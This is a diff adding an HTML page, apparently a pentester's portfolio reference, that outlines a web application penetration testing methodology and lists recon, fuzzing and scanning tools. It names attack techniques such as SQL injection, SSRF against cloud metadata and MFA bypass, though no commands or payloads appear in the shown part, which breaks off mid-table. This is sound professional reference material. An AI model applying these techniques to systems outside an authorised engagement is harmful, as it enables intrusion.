@@ -1,0 +1,2279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Tools & Methodology — Opeyemi Ariyo</title>
+  <meta name="description" content="Penetration testing toolkit and workflows covering web application, cloud, Active Directory, and network security assessments." />
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet" />
+  <style>
+    /* ── Reset ── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; font-size: 16px; }
+
+    /* ── Design tokens ── */
+    :root {
+      --bg:         #0d1117;
+      --surface:    #161b22;
+      --card:       #1a2130;
+      --border:     rgba(255,255,255,0.07);
+      --primary:    #00dc82;
+      --primary-d:  rgba(0,220,130,0.12);
+      --secondary:  #ff3e88;
+      --warn:       #f59e0b;
+      --danger:     #ef4444;
+      --text:       #c9d1d9;
+      --text-dim:   #6e7681;
+      --mono:       'JetBrains Mono', monospace;
+      --heading:    'Orbitron', sans-serif;
+      --sidebar-w:  240px;
+      --topbar-h:   56px;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--mono);
+      line-height: 1.7;
+      overflow-x: hidden;
+    }
+
+    /* ── Scrollbar ── */
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: rgba(0,220,130,0.3); border-radius: 3px; }
+
+    /* ══════════════════════════════
+       TOP NAV
+    ══════════════════════════════ */
+    .tm-nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: var(--topbar-h);
+      z-index: 300;
+      background: rgba(13,17,23,0.92);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 1.5rem;
+      gap: 1rem;
+    }
+    .tm-nav-brand {
+      font-family: var(--mono);
+      font-size: 0.78rem;
+      font-weight: 700;
+      color: var(--primary);
+      letter-spacing: 1px;
+      white-space: nowrap;
+      text-decoration: none;
+    }
+    .tm-nav-brand span { color: var(--text-dim); }
+    .tm-nav-links {
+      display: flex;
+      gap: 1.5rem;
+      list-style: none;
+      align-items: center;
+    }
+    .tm-nav-links a {
+      font-size: 0.72rem;
+      font-weight: 600;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+    .tm-nav-links a:hover { color: var(--primary); }
+    .tm-nav-links .active { color: var(--primary); }
+    .tm-nav-back {
+      font-size: 0.72rem;
+      font-weight: 600;
+      letter-spacing: 1px;
+      color: var(--text-dim);
+      text-decoration: none;
+      border: 1px solid var(--border);
+      border-radius: 5px;
+      padding: 0.3rem 0.8rem;
+      transition: color 0.2s, border-color 0.2s;
+      white-space: nowrap;
+    }
+    .tm-nav-back:hover { color: var(--primary); border-color: rgba(0,220,130,0.4); }
+
+    /* Mobile sidebar toggle */
+    .tm-sidebar-toggle {
+      display: none;
+      background: none;
+      border: 1px solid var(--border);
+      color: var(--text-dim);
+      border-radius: 5px;
+      padding: 0.3rem 0.6rem;
+      cursor: pointer;
+      font-size: 1rem;
+      line-height: 1;
+    }
+
+    /* ══════════════════════════════
+       LAYOUT: sidebar + main
+    ══════════════════════════════ */
+    .tm-layout {
+      display: flex;
+      min-height: 100vh;
+      padding-top: var(--topbar-h);
+    }
+
+    /* ── Sidebar ── */
+    .tm-sidebar {
+      position: fixed;
+      top: var(--topbar-h);
+      left: 0;
+      bottom: 0;
+      width: var(--sidebar-w);
+      background: var(--surface);
+      border-right: 1px solid var(--border);
+      overflow-y: auto;
+      padding: 1.5rem 0 2rem;
+      z-index: 200;
+      transition: transform 0.3s;
+    }
+    .tm-sidebar::-webkit-scrollbar { width: 3px; }
+
+    .tm-sidebar-section {
+      margin-bottom: 1.4rem;
+    }
+    .tm-sidebar-label {
+      font-size: 0.6rem;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: var(--primary);
+      padding: 0 1.2rem 0.4rem;
+      display: block;
+    }
+    .tm-sidebar-links {
+      list-style: none;
+    }
+    .tm-sidebar-links li a {
+      display: block;
+      padding: 0.35rem 1.2rem;
+      font-size: 0.72rem;
+      color: var(--text-dim);
+      text-decoration: none;
+      border-left: 2px solid transparent;
+      transition: color 0.2s, border-color 0.2s, background 0.2s;
+      line-height: 1.4;
+    }
+    .tm-sidebar-links li a:hover,
+    .tm-sidebar-links li a.active {
+      color: var(--primary);
+      border-left-color: var(--primary);
+      background: var(--primary-d);
+    }
+
+    /* ── Main content ── */
+    .tm-main {
+      margin-left: var(--sidebar-w);
+      flex: 1;
+      max-width: 100%;
+      padding: 0;
+    }
+
+    /* ══════════════════════════════
+       HERO
+    ══════════════════════════════ */
+    .tm-hero {
+      padding: 4rem 3rem 3rem;
+      border-bottom: 1px solid var(--border);
+      position: relative;
+      overflow: hidden;
+    }
+    .tm-hero::before {
+      content: '';
+      position: absolute;
+      top: -60px; right: -60px;
+      width: 300px; height: 300px;
+      background: radial-gradient(circle, rgba(0,220,130,0.07) 0%, transparent 70%);
+      pointer-events: none;
+    }
+    .tm-hero-badge {
+      display: inline-block;
+      font-size: 0.65rem;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: var(--primary);
+      background: var(--primary-d);
+      border: 1px solid rgba(0,220,130,0.25);
+      border-radius: 4px;
+      padding: 0.28rem 0.7rem;
+      margin-bottom: 1.2rem;
+    }
+    .tm-hero h1 {
+      font-family: var(--heading);
+      font-size: clamp(1.6rem, 4vw, 2.6rem);
+      font-weight: 900;
+      color: #fff;
+      line-height: 1.15;
+      margin-bottom: 0.6rem;
+    }
+    .tm-hero h1 span { color: var(--primary); }
+    .tm-hero-sub {
+      font-size: 0.88rem;
+      color: var(--text-dim);
+      margin-bottom: 1.5rem;
+      max-width: 600px;
+      line-height: 1.7;
+    }
+    .tm-hero-pills {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+    .tm-hero-pill {
+      font-size: 0.68rem;
+      font-weight: 600;
+      letter-spacing: 1px;
+      color: var(--text-dim);
+      background: rgba(255,255,255,0.04);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 0.25rem 0.75rem;
+    }
+
+    /* ── Search bar ── */
+    .tm-search-wrap {
+      padding: 1.2rem 3rem;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+    }
+    .tm-search-icon { color: var(--text-dim); font-size: 0.85rem; flex-shrink: 0; }
+    .tm-search {
+      flex: 1;
+      max-width: 420px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 7px;
+      color: var(--text);
+      font-family: var(--mono);
+      font-size: 0.8rem;
+      padding: 0.55rem 0.9rem;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .tm-search:focus { border-color: rgba(0,220,130,0.4); }
+    .tm-search::placeholder { color: var(--text-dim); }
+    .tm-search-hint { font-size: 0.68rem; color: var(--text-dim); }
+
+    /* ══════════════════════════════
+       CONTENT SECTIONS
+    ══════════════════════════════ */
+    .tm-content {
+      padding: 2.5rem 3rem 5rem;
+      max-width: 1000px;
+    }
+
+    .tm-section {
+      margin-bottom: 4rem;
+      scroll-margin-top: calc(var(--topbar-h) + 1rem);
+    }
+
+    .tm-section-header {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      margin-bottom: 1.8rem;
+      padding-bottom: 1rem;
+      border-bottom: 1px solid var(--border);
+    }
+    .tm-section-icon {
+      font-size: 1.3rem;
+      flex-shrink: 0;
+    }
+    .tm-section-title {
+      font-family: var(--heading);
+      font-size: 1rem;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: 1px;
+    }
+    .tm-section-badge {
+      font-size: 0.6rem;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--primary);
+      background: var(--primary-d);
+      border: 1px solid rgba(0,220,130,0.2);
+      border-radius: 4px;
+      padding: 0.2rem 0.55rem;
+      margin-left: auto;
+      white-space: nowrap;
+    }
+
+    .tm-subsection {
+      margin-bottom: 2.5rem;
+      scroll-margin-top: calc(var(--topbar-h) + 1rem);
+    }
+    .tm-subsection-title {
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: var(--primary);
+      margin-bottom: 1.2rem;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+    }
+    .tm-subsection-title::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    /* ── Methodology accordion ── */
+    .tm-accordion {
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: hidden;
+      margin-bottom: 1.2rem;
+    }
+    .tm-accordion-head {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      padding: 0.9rem 1.2rem;
+      background: var(--surface);
+      cursor: pointer;
+      user-select: none;
+      transition: background 0.2s;
+      list-style: none;
+      border: none;
+      width: 100%;
+      text-align: left;
+    }
+    .tm-accordion-head::-webkit-details-marker { display: none; }
+    details[open] > .tm-accordion-head { background: rgba(0,220,130,0.05); }
+    .tm-accordion-head:hover { background: rgba(255,255,255,0.03); }
+    .tm-step-num {
+      font-family: var(--heading);
+      font-size: 0.75rem;
+      font-weight: 900;
+      color: var(--primary);
+      background: var(--primary-d);
+      border: 1px solid rgba(0,220,130,0.25);
+      border-radius: 5px;
+      padding: 0.2rem 0.55rem;
+      flex-shrink: 0;
+      min-width: 2rem;
+      text-align: center;
+    }
+    .tm-accordion-label {
+      font-size: 0.83rem;
+      font-weight: 600;
+      color: #fff;
+      flex: 1;
+    }
+    .tm-accordion-sub {
+      font-size: 0.72rem;
+      color: var(--text-dim);
+      display: none;
+    }
+    details[open] .tm-accordion-sub { display: block; }
+    .tm-accordion-chevron {
+      color: var(--text-dim);
+      font-size: 0.8rem;
+      transition: transform 0.2s;
+      flex-shrink: 0;
+    }
+    details[open] .tm-accordion-chevron { transform: rotate(180deg); color: var(--primary); }
+
+    .tm-accordion-body {
+      padding: 1rem 1.2rem 1.2rem;
+      border-top: 1px solid var(--border);
+      background: rgba(0,0,0,0.15);
+    }
+    .tm-accordion-body ul {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 0.35rem;
+    }
+    .tm-accordion-body ul li {
+      font-size: 0.8rem;
+      color: var(--text-dim);
+      padding-left: 1rem;
+      position: relative;
+      line-height: 1.5;
+    }
+    .tm-accordion-body ul li::before {
+      content: '→';
+      position: absolute;
+      left: 0;
+      color: var(--primary);
+      font-size: 0.7rem;
+    }
+    .tm-accordion-body ul li strong { color: var(--text); }
+
+    /* ── Tool tables ── */
+    .tm-table-wrap {
+      overflow-x: auto;
+      border-radius: 10px;
+      border: 1px solid var(--border);
+      margin-bottom: 1.5rem;
+    }
+    .tm-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.8rem;
+    }
+    .tm-table thead tr {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+    }
+    .tm-table th {
+      padding: 0.75rem 1rem;
+      text-align: left;
+      font-size: 0.65rem;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      white-space: nowrap;
+    }
+    .tm-table th:first-child { color: var(--primary); }
+    .tm-table tbody tr {
+      border-bottom: 1px solid rgba(255,255,255,0.04);
+      transition: background 0.15s;
+    }
+    .tm-table tbody tr:last-child { border-bottom: none; }
+    .tm-table tbody tr:hover { background: rgba(0,220,130,0.03); }
+    .tm-table td {
+      padding: 0.7rem 1rem;
+      vertical-align: top;
+      line-height: 1.5;
+    }
+    .tm-table td:first-child {
+      font-weight: 600;
+      color: #fff;
+      white-space: nowrap;
+    }
+    .tm-table td:last-child { color: var(--text-dim); }
+    .tool-row-hidden { display: none; }
+
+    /* tool category label above table */
+    .tm-tool-group {
+      margin-bottom: 1.8rem;
+    }
+    .tm-tool-group-label {
+      font-size: 0.68rem;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      margin-bottom: 0.6rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .tm-tool-group-label span {
+      color: var(--secondary);
+    }
+
+    /* ── Code / cheatsheet blocks ── */
+    .tm-code-block {
+      position: relative;
+      background: #090d12;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: hidden;
+      margin-bottom: 1.2rem;
+    }
+    .tm-code-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0.5rem 0.9rem;
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+    }
+    .tm-code-lang {
+      font-size: 0.65rem;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--primary);
+    }
+    .tm-copy-btn {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      font-weight: 600;
+      letter-spacing: 1px;
+      color: var(--text-dim);
+      background: none;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 0.2rem 0.55rem;
+      cursor: pointer;
+      transition: color 0.2s, border-color 0.2s;
+    }
+    .tm-copy-btn:hover { color: var(--primary); border-color: rgba(0,220,130,0.4); }
+    .tm-copy-btn.copied { color: var(--primary); border-color: var(--primary); }
+    .tm-code-block pre {
+      padding: 1rem 1.1rem;
+      overflow-x: auto;
+      margin: 0;
+    }
+    .tm-code-block code {
+      font-family: var(--mono);
+      font-size: 0.78rem;
+      color: #a8d8a8;
+      line-height: 1.7;
+      white-space: pre;
+    }
+    .tm-code-block code .cmd { color: var(--primary); }
+    .tm-code-block code .comment { color: var(--text-dim); }
+    .tm-code-block code .flag { color: #f59e0b; }
+    .tm-code-block code .val { color: #ff3e88; }
+
+    /* ── Tip blocks ── */
+    .tm-tip {
+      background: rgba(0,220,130,0.05);
+      border-left: 3px solid var(--primary);
+      border-radius: 0 7px 7px 0;
+      padding: 0.9rem 1.1rem;
+      margin-bottom: 1.2rem;
+      font-size: 0.8rem;
+      color: var(--text-dim);
+      line-height: 1.6;
+    }
+    .tm-tip strong { color: #fff; }
+    .tm-tip code {
+      font-family: var(--mono);
+      font-size: 0.76rem;
+      color: var(--primary);
+      background: var(--primary-d);
+      border-radius: 3px;
+      padding: 0.05rem 0.3rem;
+    }
+
+    /* ── Report steps ── */
+    .tm-numbered-list {
+      display: flex;
+      flex-direction: column;
+      gap: 0.6rem;
+      margin-bottom: 1.2rem;
+    }
+    .tm-numbered-item {
+      display: flex;
+      gap: 0.9rem;
+      align-items: flex-start;
+      padding: 0.8rem 1rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      font-size: 0.8rem;
+    }
+    .tm-numbered-item-n {
+      font-family: var(--heading);
+      font-size: 0.75rem;
+      font-weight: 900;
+      color: var(--primary);
+      flex-shrink: 0;
+      min-width: 1.4rem;
+      padding-top: 0.05rem;
+    }
+    .tm-numbered-item-text {
+      color: var(--text-dim);
+      line-height: 1.5;
+    }
+    .tm-numbered-item-text strong { color: #fff; }
+
+    /* ── Back to top ── */
+    #backToTop {
+      position: fixed;
+      bottom: 1.5rem;
+      right: 1.5rem;
+      width: 38px;
+      height: 38px;
+      background: var(--primary);
+      color: var(--bg);
+      border: none;
+      border-radius: 50%;
+      font-size: 1rem;
+      cursor: pointer;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      box-shadow: 0 4px 20px rgba(0,220,130,0.35);
+      font-weight: 700;
+      transition: transform 0.2s, opacity 0.2s;
+    }
+    #backToTop:hover { transform: translateY(-2px); }
+    #backToTop.visible { display: flex; }
+
+    /* ══════════════════════════════
+       RESPONSIVE
+    ══════════════════════════════ */
+    @media (max-width: 900px) {
+      .tm-sidebar {
+        transform: translateX(-100%);
+      }
+      .tm-sidebar.open {
+        transform: translateX(0);
+        box-shadow: 4px 0 30px rgba(0,0,0,0.5);
+      }
+      .tm-main { margin-left: 0; }
+      .tm-sidebar-toggle { display: flex; }
+      .tm-nav-links { display: none; }
+      .tm-hero { padding: 2.5rem 1.5rem 2rem; }
+      .tm-search-wrap { padding: 1rem 1.5rem; }
+      .tm-content { padding: 2rem 1.5rem 4rem; }
+    }
+
+    @media (max-width: 600px) {
+      .tm-hero h1 { font-size: 1.4rem; }
+      .tm-section-title { font-size: 0.88rem; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ══ TOP NAV ══ -->
+<nav class="tm-nav">
+  <a href="/" class="tm-nav-brand">root💀<span>opemi.aa</span></a>
+  <ul class="tm-nav-links">
+    <li><a href="#web-app">Web App</a></li>
+    <li><a href="#cloud">Cloud</a></li>
+    <li><a href="#active-directory">Active Directory</a></li>
+    <li><a href="#network">Network</a></li>
+    <li><a href="#blue-team">Blue Team</a></li>
+    <li><a href="#cheatsheets">Cheatsheets</a></li>
+  </ul>
+  <div style="display:flex;gap:0.7rem;align-items:center;">
+    <button class="tm-sidebar-toggle" id="sidebarToggle" aria-label="Toggle sidebar">☰</button>
+    <a href="/" class="tm-nav-back">← Portfolio</a>
+  </div>
+</nav>
+
+<!-- ══ LAYOUT ══ -->
+<div class="tm-layout">
+
+  <!-- ── Sidebar ── -->
+  <aside class="tm-sidebar" id="sidebar">
+
+    <div class="tm-sidebar-section">
+      <span class="tm-sidebar-label">External</span>
+      <ul class="tm-sidebar-links">
+        <li><a href="#web-app">🌐 Web Application</a></li>
+        <li><a href="#cloud">☁️ Cloud Pentest</a></li>
+      </ul>
+    </div>
+
+    <div class="tm-sidebar-section">
+      <span class="tm-sidebar-label">Internal</span>
+      <ul class="tm-sidebar-links">
+        <li><a href="#active-directory">🏢 Active Directory</a></li>
+        <li><a href="#network">📡 Network Attacks</a></li>
+      </ul>
+    </div>
+
+    <div class="tm-sidebar-section">
+      <span class="tm-sidebar-label">Operations</span>
+      <ul class="tm-sidebar-links">
+        <li><a href="#reporting">📋 Reporting</a></li>
+        <li><a href="#blue-team">🛡️ Blue Team / SOC</a></li>
+      </ul>
+    </div>
+
+    <div class="tm-sidebar-section">
+      <span class="tm-sidebar-label">Reference</span>
+      <ul class="tm-sidebar-links">
+        <li><a href="#cheatsheets">⚡ Cheat Sheets</a></li>
+      </ul>
+    </div>
+
+  </aside>
+
+  <!-- ── Main ── -->
+  <main class="tm-main">
+
+    <!-- Hero -->
+    <div class="tm-hero">
+      <div class="tm-hero-badge">// Tools &amp; Methodology</div>
+      <h1>Penetration Testing<br><span>Arsenal &amp; Workflows</span></h1>
+      <p class="tm-hero-sub">
+        A living reference documenting my approach to security assessments across web applications,
+        cloud infrastructure, Active Directory environments, and internal networks.
+        Built for interviews, engagements, and future-me.
+      </p>
+      <div class="tm-hero-pills">
+        <span class="tm-hero-pill">Web App Pentest</span>
+        <span class="tm-hero-pill">Cloud Security</span>
+        <span class="tm-hero-pill">Active Directory</span>
+        <span class="tm-hero-pill">Network Attacks</span>
+        <span class="tm-hero-pill">OWASP Top 10</span>
+        <span class="tm-hero-pill">API Testing</span>
+        <span class="tm-hero-pill">SOC / Blue Team</span>
+      </div>
+    </div>
+
+    <!-- Search -->
+    <div class="tm-search-wrap">
+      <span class="tm-search-icon">🔍</span>
+      <input
+        type="text"
+        class="tm-search"
+        id="toolSearch"
+        placeholder="Search tools by name or purpose..."
+        autocomplete="off"
+      />
+      <span class="tm-search-hint" id="searchHint"></span>
+    </div>
+
+    <!-- ════ CONTENT ════ -->
+    <div class="tm-content">
+
+      <!-- ════════════════════════════════
+           SECTION 1: WEB APPLICATION
+      ════════════════════════════════ -->
+      <section class="tm-section" id="web-app">
+        <div class="tm-section-header">
+          <span class="tm-section-icon">🌐</span>
+          <h2 class="tm-section-title">Web Application Pentest</h2>
+          <span class="tm-section-badge">OWASP Aligned</span>
+        </div>
+
+        <!-- Methodology -->
+        <div class="tm-subsection" id="web-methodology">
+          <div class="tm-subsection-title">Methodology</div>
+
+          <details class="tm-accordion" open>
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">01</span>
+              <span class="tm-accordion-label">Reconnaissance &amp; Scope Definition</span>
+              <span class="tm-accordion-sub">Passive intel gathering before touching the target</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li>Confirm scope: domains, IP ranges, out-of-scope assets, rules of engagement</li>
+                <li><strong>Passive DNS:</strong> Enumerate subdomains without direct contact (crt.sh, Shodan, OSINT)</li>
+                <li><strong>Tech fingerprinting:</strong> Identify frameworks, CMS, server headers, CDN via Wappalyzer / WhatWeb</li>
+                <li><strong>Google dorks:</strong> Find exposed panels, error pages, backup files, sensitive params</li>
+                <li>Map third-party integrations: payment gateways, OAuth providers, API backends</li>
+                <li>Review JavaScript files for hidden endpoints, tokens, and internal hostnames</li>
+              </ul>
+            </div>
+          </details>
+
+          <details class="tm-accordion">
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">02</span>
+              <span class="tm-accordion-label">Discovery &amp; Attack Surface Mapping</span>
+              <span class="tm-accordion-sub">Active crawling, directory brute-force, endpoint enumeration</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li><strong>Spider/crawl</strong> the target in Burp Suite to capture all requests</li>
+                <li>Directory &amp; file brute-force with ffuf / feroxbuster using SecLists wordlists</li>
+                <li>Parameter discovery: arjun, x8 — find hidden GET/POST parameters</li>
+                <li>JS link extraction: LinkFinder / subjs to pull API routes from scripts</li>
+                <li>Identify input surfaces: forms, file uploads, search fields, headers (Host, X-Forwarded-For)</li>
+                <li>Map authentication flows: login, registration, password reset, MFA bypass paths</li>
+              </ul>
+            </div>
+          </details>
+
+          <details class="tm-accordion">
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">03</span>
+              <span class="tm-accordion-label">Vulnerability Assessment</span>
+              <span class="tm-accordion-sub">Identify and confirm exploitable weaknesses across OWASP Top 10</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li><strong>Injection:</strong> SQL injection (manual + sqlmap), XSS (reflected/stored/DOM), SSTI, command injection, XXE</li>
+                <li><strong>Auth flaws:</strong> Broken auth, JWT tampering, session fixation, insecure password reset tokens</li>
+                <li><strong>IDOR &amp; BOLA:</strong> Object-level auth bypass — change IDs in requests, check responses for cross-user data</li>
+                <li><strong>SSRF:</strong> Internal network access via user-controlled URLs — probe for cloud metadata endpoints</li>
+                <li><strong>File upload:</strong> Extension bypass, MIME type confusion, path traversal, stored XSS via SVG</li>
+                <li><strong>Misconfiguration:</strong> CORS wildcard, verbose error messages, exposed admin paths, default credentials</li>
+                <li>Business logic: price manipulation, coupon stacking, workflow skipping, mass assignment</li>
+              </ul>
+            </div>
+          </details>
+
+          <details class="tm-accordion">
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">04</span>
+              <span class="tm-accordion-label">Exploitation &amp; Impact Demonstration</span>
+              <span class="tm-accordion-sub">Prove exploitability with minimal footprint</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li>Exploit confirmed vulnerabilities to demonstrate real-world impact — no destructive actions</li>
+                <li>Chain vulnerabilities for escalated impact (e.g. SSRF → IDOR → data exfil)</li>
+                <li>Capture screenshots and request/response pairs as evidence for each finding</li>
+                <li>Test privilege escalation: horizontal (access other users' data) and vertical (escalate to admin)</li>
+                <li>Session token analysis: entropy, duration, revocation on logout</li>
+                <li>Document CVSS score estimate and business impact for each finding</li>
+              </ul>
+            </div>
+          </details>
+
+          <details class="tm-accordion">
+            <summary class="tm-accordion-head">
+              <span class="tm-step-num">05</span>
+              <span class="tm-accordion-label">Reporting &amp; Remediation Guidance</span>
+              <span class="tm-accordion-sub">Clear findings with actionable fixes</span>
+              <span class="tm-accordion-chevron">▾</span>
+            </summary>
+            <div class="tm-accordion-body">
+              <ul>
+                <li>Structure: Executive Summary → Scope → Risk Ratings → Findings → Remediation → Appendix</li>
+                <li>Each finding: title, severity (Critical/High/Medium/Low/Info), description, PoC steps, evidence, recommendation</li>
+                <li>Prioritise by exploitability × business impact — not just CVSS score</li>
+                <li>Include code-level fixes where possible (sanitise input, parameterised queries, etc.)</li>
+                <li>Follow-up retest: verify each remediation was correctly applied</li>
+              </ul>
+            </div>
+          </details>
+        </div>
+
+        <!-- Tools: Reconnaissance -->
+        <div class="tm-subsection" id="web-recon">
+          <div class="tm-subsection-title">Reconnaissance Tools</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead>
+                <tr>
+                  <th>Tool</th>
+                  <th>Category</th>
+                  <th>Use Case</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Amass</td>
+                  <td>Subdomain Enum</td>
+                  <td>Passive + active DNS enumeration, ASN-based discovery, OSINT sources aggregated</td>
+                </tr>
+                <tr>
+                  <td>Subfinder</td>
+                  <td>Subdomain Enum</td>
+                  <td>Fast passive subdomain discovery using APIs (crt.sh, Shodan, VirusTotal, etc.)</td>
+                </tr>
+                <tr>
+                  <td>crt.sh</td>
+                  <td>Cert Transparency</td>
+                  <td>Certificate transparency log search — find subdomains from SSL cert history</td>
+                </tr>
+                <tr>
+                  <td>Shodan</td>
+                  <td>Internet Scanning</td>
+                  <td>Discover internet-facing assets, open ports, banners, vuln signatures for target org</td>
+                </tr>
+                <tr>
+                  <td>WhatWeb</td>
+                  <td>Fingerprinting</td>
+                  <td>Identify CMS, frameworks, server version, plugins from HTTP responses</td>
+                </tr>
+                <tr>
+                  <td>Wappalyzer</td>
+                  <td>Fingerprinting</td>
+                  <td>Browser extension / CLI to detect tech stack — React, WordPress, nginx, etc.</td>
+                </tr>
+                <tr>
+                  <td>theHarvester</td>
+                  <td>OSINT</td>
+                  <td>Email addresses, names, hostnames, IPs from public sources (Google, LinkedIn, etc.)</td>
+                </tr>
+                <tr>
+                  <td>LinkFinder</td>
+                  <td>JS Analysis</td>
+                  <td>Extract endpoints and hidden API routes from JavaScript files</td>
+                </tr>
+                <tr>
+                  <td>waymore</td>
+                  <td>URL Discovery</td>
+                  <td>Pulls URLs from Wayback Machine, Common Crawl, AlienVault OTX for passive recon</td>
+                </tr>
+                <tr>
+                  <td>gau</td>
+                  <td>URL Discovery</td>
+                  <td>GetAllUrls — fetch known URLs from Wayback, URLScan, OTX for a domain</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Tools: Discovery & Fuzzing -->
+        <div class="tm-subsection" id="web-fuzzing">
+          <div class="tm-subsection-title">Discovery &amp; Fuzzing Tools</div>
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead>
+                <tr>
+                  <th>Tool</th>
+                  <th>Category</th>
+                  <th>Use Case</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>ffuf</td>
+                  <td>Directory / Parameter Fuzzing</td>
+                  <td>Fast web fuzzer — directory brute-force, vhost discovery, parameter fuzzing with filtering flags</td>
+                </tr>
+                <tr>
+                  <td>feroxbuster</td>
+                  <td>Directory Brute-force</td>
+                  <td>Recursive directory discovery in Rust — faster than gobuster for deep enumeration</td>
+                </tr>
+                <tr>
+                  <td>gobuster</td>
+                  <td>Directory / DNS</td>
+                  <td>Dir mode for file/folder brute-force; DNS mode for subdomain enumeration</td>
+                </tr>
+                <tr>
+                  <td>arjun</td>
+                  <td>Parameter Discovery</td>
+                  <td>Find hidden GET/POST/JSON parameters from a wordlist — reveals undocumented inputs</td>
+                </tr>
+                <tr>
+                  <td>x8</td>
+                  <td>Parameter Discovery</td>
+                  <td>Hidden parameter discovery — faster alternative to arjun with request deduplication</td>
+                </tr>
+                <tr>
+                  <td>SecLists</td>
+                  <td>Wordlists</td>
+                  <td>Gold-standard wordlist collection: directories, subdomains, passwords, payloads, fuzzing</td>
+                </tr>
+                <tr>
+                  <td>Burp Suite (Spider)</td>
+                  <td>Crawling</td>
+                  <td>Passive + active spider captures all app endpoints, forms, parameters during manual browsing</td>
+                </tr>
+                <tr>
+                  <td>hakrawler</td>
+                  <td>Web Crawling</td>
+                  <td>Fast Go-based crawler — discovers JS files, forms, endpoints, links for a target domain</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Tools: Vulnerability Scanning -->
+        <div class="tm-subsection" id="web-vulnscan">
+          <div class="tm-subsection-title">Vulnerability Scanning &amp; Exploitation</div>
+
+          <div class="tm-tip">
+            <strong>Proxy everything through Burp Suite.</strong> Set Burp as your browser proxy before any active testing.
+            All requests are captured in HTTP History — you can replay, modify, and fuzz from the Repeater and Intruder tabs.
+          </div>
+
+          <div class="tm-table-wrap">
+            <table class="tm-table">
+              <thead>
+                <tr>
+                  <th>Tool</th>
+                  <th>Category</th>
+                  <th>Use Case</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Burp Suite Pro</td>
+                  <td>Web Proxy / Scanner</td>
+                  <td>Intercept, modify, replay HTTP/S requests; active scanner for XSS, SQLi, SSRF, IDOR, auth issues</td>
+                </tr>
+                <tr>
+                  <td>sqlmap</td>
+                  <td>SQL Injection</td>
+                  <td>Automated SQLi detection and exploitation — supports boolean, time-based, error-based, union attacks</td>
+                </tr>
+                <tr>
+                  <td>XSStrike</td>
